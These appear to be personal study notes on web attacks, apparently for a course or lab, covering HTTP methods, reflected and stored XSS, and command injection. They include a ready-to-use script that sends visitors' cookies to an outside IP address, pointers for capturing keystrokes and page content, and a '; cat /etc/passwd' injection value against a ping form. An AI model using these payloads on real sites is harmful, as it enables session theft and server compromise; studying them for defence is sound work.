HTTP
  ##tools to use tpdump, wireshark   https://tools.ietf.org/html/rfc2616 
  ## only focusing on GET & POST

HTTP method 
GET request can be utilized to pass data to the server using the URL string:
  http://10.50.x.x/path

CROSS-SITE SCRIPTING (XSS)
  -Insertion of arbitrary code into a webpage, that executes in the browser of visitors
  -Unsanitized GET, POST, and PUT methods allow JS to be placed on websites

REFLECTED XSS
-Most common form of XSS
Transient, occurs in error messages or search results
Delivered through intermediate media, such as a link in an email
Characters that are normally illegal in URLs can be Base64 encoded

STORED XSS
Resides on vulnerable site
Only requires user to visit page

script to post info
<script>document.location="http://10.50.153.198:XXXX/?username=" + document.cookie;</script>
Capturing Keystrokes
bind keydown and keyup
Capturing Sensitive Data add this to the script    ##document.body.innerHTML

find /path/to/directory -type f -perm -o=r ## find any files that is readable

COMMAND INJECTION
##Application on the server is vulnerable, allowing execution of arbitrary commands
User input not validated
  Common example is a SOHO router, with a web page to allow ping
Might contain the following in itâ€™s code:
  system("ping -c 1 ".$_GET["ip"]);
Run the following to chain/stack our arbitrary command
  ; cat /etc/passwd
